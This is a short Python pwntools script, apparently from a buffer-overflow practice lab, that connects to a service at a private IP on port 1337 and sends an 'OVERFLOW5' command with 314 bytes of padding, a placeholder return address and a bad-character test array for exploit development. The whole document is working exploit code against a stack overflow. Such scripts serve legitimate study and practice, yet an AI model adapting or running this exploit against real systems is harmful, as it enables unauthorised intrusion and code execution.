#!/usr/bin/env python3

from pwn import *

host = "10.10.49.190"
port = 1337

s = remote(host, port)
total_length = 1000
offset = 314
new_eip = b"BBBB"
all_chars = bytearray(range(1,256))
bad_chars = [
    b"\x16",
    b"\x2f",
    b"\xf4",
    b"\xfd",
]

for bad_chars in bad_chars:
    all_chars = all_chars.replace(bad_chars, b"")

payload = [
    b"OVERFLOW5 ",
    b"A" * offset,
    new_eip,
    all_chars,
    b"C" * (total_length - offset - len(new_eip) - len(all_chars)),

]

payload = b"".join(payload)
s.send(payload)
s.close()